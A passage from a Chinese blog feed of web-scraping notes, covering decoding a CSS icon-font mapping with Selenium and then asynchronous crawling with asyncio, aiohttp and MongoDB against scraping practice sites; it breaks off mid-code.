class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://antispider4.scrape.center/css/app.654ba59e.css&#x27;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;\.icon-(.*?):before\&#123;content:&quot;(.*?)&quot;\&#125;&#x27;</span>)</span><br><span class="line">results = re.findall(pattern, response.text)</span><br><span class="line">icon_map = &#123;item[<span class="number">0</span>]: item[<span class="number">1</span>] <span class="keyword">for</span> item <span class="keyword">in</span> results&#125;</span><br><span class="line">print(icon_map)</span><br></pre></td></tr></table></figure><p><img data-src="https://s2.loli.net/2022/03/01/x1Ty6G8ZisWg245.png"></p><p>通过代码得到一个映射表，通过网页源码中的索引即可得到对应数值，如 “789”，对应 “9”，下面展示修改后代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://antispider4.scrape.center/css/app.654ba59e.css&#x27;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;\.icon-(.*?):before\&#123;content:&quot;(.*?)&quot;\&#125;&#x27;</span>)</span><br><span class="line">results = re.findall(pattern, response.text)</span><br><span class="line">icon_map = &#123;item[<span class="number">0</span>]: item[<span class="number">1</span>] <span class="keyword">for</span> item <span class="keyword">in</span> results&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_score</span>(<span class="params">item</span>):</span></span><br><span class="line">    elements = item(<span class="string">&#x27;.icon&#x27;</span>)</span><br><span class="line">    icon_values = []</span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> elements.items():</span><br><span class="line">        class_name = (element.attr(<span class="string">&#x27;class&#x27;</span>))</span><br><span class="line">        icon_key = re.search(<span class="string">&#x27;icon-(\d+)&#x27;</span>, class_name).group(<span class="number">1</span>)</span><br><span class="line">        icon_value = icon_map[icon_key]</span><br><span class="line">        icon_values.append(icon_value)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(icon_values)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">browser = webdriver.Chrome(options=options)</span><br><span class="line">browser.get(<span class="string">&#x27;https://antispider4.scrape.center/&#x27;</span>)</span><br><span class="line">WebDriverWait(browser, <span class="number">10</span>).until(EC.visibility_of_all_elements_located((By.CSS_SELECTOR, <span class="string">&#x27;.item&#x27;</span>)))</span><br><span class="line">html = browser.page_source</span><br><span class="line">doc = pq(html)</span><br><span class="line">items = doc(<span class="string">&#x27;.item&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> items.items():</span><br><span class="line">    name = item(<span class="string">&#x27;.name&#x27;</span>).text()</span><br><span class="line">    categories = [x.text() <span class="keyword">for</span> x <span class="keyword">in</span> item(<span class="string">&#x27;.categories button span&#x27;</span>).items()]</span><br><span class="line">    score = parse_score(item)</span><br><span class="line">    print(<span class="string">f&#x27;name: <span class="subst">&#123;name&#125;</span> categories: <span class="subst">&#123;categories&#125;</span> score: <span class="subst">&#123;score&#125;</span>&#x27;</span>)</span><br><span class="line">browser.close()</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">name: 霸王别姬 - Farewell My Concubine categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>] score: <span class="number">9.5</span></span><br><span class="line">name: 这个杀手不太冷 - Léon categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;动作&#x27;</span>, <span class="string">&#x27;犯罪&#x27;</span>] score: <span class="number">9.5</span></span><br><span class="line">name: 肖申克的救赎 - The Shawshank Redemption categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;犯罪&#x27;</span>] score: <span class="number">9.5</span></span><br><span class="line">name: 泰坦尼克号 - Titanic categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>, <span class="string">&#x27;灾难&#x27;</span>] score: <span class="number">9.5</span></span><br><span class="line">name: 罗马假日 - Roman Holiday categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;喜剧&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>] score: <span class="number">9.5</span></span><br><span class="line">name: 唐伯虎点秋香 - Flirting Scholar categories: [<span class="string">&#x27;喜剧&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>, <span class="string">&#x27;古装&#x27;</span>] score: <span class="number">9.5</span></span><br><span class="line">name: 乱世佳人 - Gone <span class="keyword">with</span> the Wind categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>, <span class="string">&#x27;历史&#x27;</span>, <span class="string">&#x27;战争&#x27;</span>] score: <span class="number">9.5</span></span><br><span class="line">name: 喜剧之王 - The King of Comedy categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;喜剧&#x27;</span>, <span class="string">&#x27;爱情&#x27;</span>] score: <span class="number">9.5</span></span><br><span class="line">name: 楚门的世界 - The Truman Show categories: [<span class="string">&#x27;剧情&#x27;</span>, <span class="string">&#x27;科幻&#x27;</span>] score: <span class="number">9.0</span></span><br><span class="line">name: 狮子王 - The Lion King categories: [<span class="string">&#x27;动画&#x27;</span>, <span class="string">&#x27;歌舞&#x27;</span>, <span class="string">&#x27;冒险&#x27;</span>] score: <span class="number">9.0</span></span><br></pre></td></tr></table></figure><p>本案例较为特殊，据此也明白了即使获取了源代码也不一定能得到关键信息，需要仔细观察一些规律才可以。</p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://s2.loli.net/2022/02/15/MUcb8kYIRaP21gN.png&quot; style=&quot;zoom: 67%;&quot; /&gt;

&lt;p&gt;有些场景，比如 Ajax 接口中有加密参数或是像 ECharts 这种经过 Js 计算生成的页面，很难去爬取和分析规律，本章我们来了解一种技术，归纳为“所见即所爬”，我们可以直接模拟浏览器运行，然后爬取数据。&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://speedpromise.github.io/categories/Python/"/>
    
    
    <category term="爬虫笔记" scheme="https://speedpromise.github.io/tags/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>爬虫笔记六 -- 异步爬虫</title>
    <link href="https://speedpromise.github.io/archives/57744bfb.html"/>
    <id>https://speedpromise.github.io/archives/57744bfb.html</id>
    <published>2022-02-22T12:09:20.000Z</published>
    <updated>2022-02-23T05:02:51.805Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://s2.loli.net/2022/02/15/MUcb8kYIRaP21gN.png" style="zoom: 67%;" /><p>爬虫是 IO 密集型任务，当使用 requests 库爬虫某个站点，发出请求后必须等待网站返回响应，才能继续运行，那有没有可以优化的方案呢？本章来了解一下异步爬虫的概念。</p><span id="more"></span><p>先看一个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s : %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">TOTAL = <span class="number">5</span></span><br><span class="line">URL = <span class="string">&#x27;https://www.httpbin.org/delay/5&#x27;</span></span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, TOTAL + <span class="number">1</span>):</span><br><span class="line">    logging.info(<span class="string">&#x27;crawling %s&#x27;</span>, URL)</span><br><span class="line">    response = requests.get(URL)</span><br><span class="line">end_time = time.time()</span><br><span class="line">logging.info(<span class="string">&#x27;total time %s seconds&#x27;</span>, end_time - start_time)</span><br></pre></td></tr></table></figure><p>需要的时间是 50 多秒，每个页面都需要等待 5 秒才能加载出来，严重拖慢爬取速度。对于这种 IO 密集型任务，使用协程就十分高效。</p><h3 id="协程的基本原理"><a href="#协程的基本原理" class="headerlink" title="协程的基本原理"></a>协程的基本原理</h3><p>协程(coroutine)，又称微线程、纤程，是一种运行在用户态的轻量级线程。</p><p>协程拥有自己的寄存器上下文和栈。协程在调度切换时，将寄存器上下文和栈保存到其他地方，等切回来的时候，再恢复先前保存的寄存器上下文和栈。因此，协程能保留上一次调用时的状态，即所有局部状态的一个特定组合，每次过程重入，就相当于进入上一次调用的状态。</p><p>我们可以用协程来实现异步操作，在网络爬虫场景中，发出请求后需要等待一定时间才能得到响应，可以利用协程去干其他事情，等得到响应后再切回来继续处理。Python 中使用协程最常用的库莫过于 asyncio。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">execute</span>(<span class="params">x</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;Number&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">&#x27;Coroutine&#x27;</span>, coroutine)</span><br><span class="line">print(<span class="string">&#x27;After calling execute&#x27;</span>)</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(coroutine)</span><br><span class="line">print(<span class="string">&#x27;After calling loop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">Coroutine &lt;coroutine <span class="built_in">object</span> execute at <span class="number">0x0000016376D324C0</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Number <span class="number">1</span></span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure><p>这里用 <code>async</code> 定义了 <code>execute</code> 方法，调用后并没有直接执行，返回了一个 coroutine 协程对象。之后使用了一个 <code>get_event_loop</code>方法创建了一个事件循环 loop，并调用了 <code>run_until_complete</code>方法将协程对象注册到事件循环中，接着启动。</p><p>task：任务，是对协程对象的进一步封装，比协程对象多了运行状态，如 running、finished 等，可以利用这些状态获取协程对象的执行情况。</p><p>上面代码实际也是将 coroutine 封装成了 task 对象，我们也可以显式声明：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">task = loop.create_task(coroutine)</span><br><span class="line"><span class="comment"># task = loop_ensure_future(coroutine)  # 另一种定义方法</span></span><br><span class="line">print(<span class="string">&#x27;Task&#x27;</span>, task)</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">&#x27;After calling loop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">Task &lt;Task pending name=<span class="string">&#x27;Task-1&#x27;</span> coro=&lt;execute() running at C:/Users/Pro/Desktop/Web Crawler Notes/test.py:<span class="number">4</span>&gt;&gt;</span><br><span class="line">Number <span class="number">1</span></span><br><span class="line">Task &lt;Task finished name=<span class="string">&#x27;Task-1&#x27;</span> coro=&lt;execute() done, defined at C:/Users/Pro/Desktop/Web Crawler Notes/test.py:<span class="number">4</span>&gt; result=<span class="literal">None</span>&gt;</span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure><p>可以看到 task 对象创建时是 pending 状态，等加到事件循环中执行后就成了 finished 状态。</p><p>task 运行完毕后可以调用 result() 方法获取运行结果，也可以绑定回调方法来获取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span>(<span class="params">task</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;Status:&#x27;</span>, task.result())</span><br><span class="line">    </span><br><span class="line">task.add_done_callback(callback)</span><br></pre></td></tr></table></figure><p>如果想要执行多次请求，可以这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">x</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;https://www.baidu.com&#x27;</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasks = [asyncio.ensure_future(request()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">    print(<span class="string">&#x27;Task result:&#x27;</span>, task.result())</span><br></pre></td></tr></table></figure><p>再回到开头的例子，这里还需要用到 aiohttp 这个异步请求库，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">url</span>):</span></span><br><span class="line">    session = aiohttp.ClientSession()</span><br><span class="line">    response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">    <span class="keyword">await</span> response.text()</span><br><span class="line">    <span class="keyword">await</span> session.close()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span>():</span></span><br><span class="line">    url = <span class="string">&#x27;https://www.httpbin.org/delay/5&#x27;</span></span><br><span class="line">    print(<span class="string">&#x27;Watting for&#x27;</span>, url)</span><br><span class="line">    response = <span class="keyword">await</span> get(url)</span><br><span class="line">    print(<span class="string">&#x27;Get response from&#x27;</span>, url, <span class="string">&#x27;response&#x27;</span>, response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasks = [asyncio.ensure_future(request()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">&#x27;Cost time&#x27;</span>, end - start)</span><br></pre></td></tr></table></figure><p>耗时时间缩到了个位数。</p><p>await 关键词可以将当前协程挂起，转而执行其他协程，运行时几乎同时所有 task 同时挂起，等到几秒后又是几乎同时返回响应，这就是异步操作的高效之处。</p><h3 id="aiohttp-的使用"><a href="#aiohttp-的使用" class="headerlink" title="aiohttp 的使用"></a>aiohttp 的使用</h3><p>asyncio 模块的内部实现了对 TCP、UDP、SSL 协议的异步操作，但没有 HTTP，而 aiohttp 是基于 asyncio 的异步 HTTP 网络模块，它既提供了服务端，也提供了客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">fetch</span>(<span class="params">session, url</span>):</span></span><br><span class="line">    <span class="comment"># session.get() 可以添加 params</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> response.text(), response.status</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        html, status = <span class="keyword">await</span> fetch(session, <span class="string">&#x27;https://cuiqingcai.com&#x27;</span>)</span><br><span class="line">        print(<span class="string">f&#x27;html, <span class="subst">&#123;html[:<span class="number">100</span>]&#125;</span>...&#x27;</span>)</span><br><span class="line">        print(<span class="string">f&#x27;status: <span class="subst">&#123;status&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    loop.run_until_complete(main())</span><br></pre></td></tr></table></figure><p>每个异步方法前面都要加上 async 来修饰，包括 with as 语句，在 Python 中，with as 语句用于声明一个上下文管理器，能够帮我们自动分配和释放资源。对于一些返回协程对象的操作，前面需要加 await 修饰。</p><p>aiohttp 也支持其他请求类型，如 POST、PUT、DELETE 等，进行 POST 请求时，不同请求参数支持不同类型的请求内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.post(url, data=data)  <span class="string">&quot;Content-Type&quot;</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">session.post(url, json=data)  <span class="string">&quot;Content-Type&quot;</span>=<span class="string">&quot;application/json&quot;</span></span><br></pre></td></tr></table></figure><p>超时设置(秒)，异常抛出为 <code>asyncio.TimeoutError</code> 类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tiemout = aiohttp.ClinetTimeout(total=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession(timeout=timeout) <span class="keyword">as</span> session:</span><br></pre></td></tr></table></figure><p>并发限制，考虑到目标网站的负载程度，可以借助 asyncio 的 <code>Semaphore</code> 来控制并发量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CONCURRENCY = <span class="number">5</span></span><br><span class="line">semaphore = asyncio.Semaphore(CONCURRENCY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">crawl_api</span>():</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">with</span> semaphore:</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">with</span> session.get(URL) <span class="keyword">as</span> renponse: </span><br></pre></td></tr></table></figure><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>爬取一个<a href="https://spa5.scrape.center/">图书网站</a>，这里我们要实现 MongoDB 的异步存储，还需要用到 motor 库。</p><p>初步分析：本站也是采用列表页和详情页的结构，加载方式是 Ajax，分页的 Ajax 请求接口格式为：<code>https://spa5.scrape.center/api/book/?limit=18&amp;offset=0</code>，offset 是每一页偏移量，limit 固定为 18，即每页书籍数量，且返回的列表页书籍中带有书籍的 id，可以据此访问书籍详情页，详情页接口格式为:<code>https://spa5.scrape.center/detail/&#123;id&#125;</code></p><p><img data-src="https://s2.loli.net/2022/02/23/nwZdlBrSsU58hJi.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ContentTypeError</span><br><span class="line"><span class="keyword">from</span> motor.motor_asyncio <span class="keyword">import</span> AsyncIOMotorClient</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO,</span><br><span class="line">                    <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s: %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">INDEX_URL = <span class="string">&#x27;https://spa5.scrape.center/api/book/?limit=&#123;limit&#125;&amp;offset=&#123;offset&#125;&#x27;</span></span><br><span class="line">DETAIL_URL = <span class="string">&#x27;https://spa5.scrape.center/api/book/&#123;id&#125;&#x27;</span></span><br><span class="line">PAGE_SIZE = <span class="number">18</span></span><br><span class="line">PAGE_NUMBER = <span class="number">1</span></span><br><span class="line">CONCURRENCY = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">MONGO_CONNECTION = <span class="string">&#x27;mongodb://localhost:27017&#x27;</span></span><br><span class="line">MONGO_DB = <span class="string">&#x27;books&#x27;</span></span><br><span class="line">MONGO_COLLECTION = <span class="string">&#x27;books&#x27;</span></span><br><span class="line"></span><br><span class="line">client = AsyncIOMotorClient(MONGO_CONNECTION)</span><br><span class="line">db = client[MONGO_DB]</span><br><span class="line">collection = db[MONGO_COLLECTION]</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.semaphore = asyncio.Semaphore(CONCURRENCY)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">crawl_api</span>(<span class="params">self, url</span>):</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> self.semaphore:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                logging.info(<span class="string">&#x27;crawling: %s&#x27;</span>, url)</span><br><span class="line">                <span class="keyword">async</span> <span class="keyword">with</span> self.session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">                    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">await</span> response.json()</span><br><span class="line">            <span class="keyword">except</span> ContentTypeError <span class="keyword">as</span> e:</span><br><span class="line">                logging.error(<span class="string">&#x27;error occurred while crawling %s&#x27;</span>, url, exc_info=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">crawl_index</span>(<span class="params">self, page</span>):</span></span><br><span class="line">        url = INDEX_URL.<span class="built_in">format</span>(limit=PAGE_SIZE, offset=PAGE_SIZE * (page - <span class="number">1</span>))</span><br><span class="line">        <span 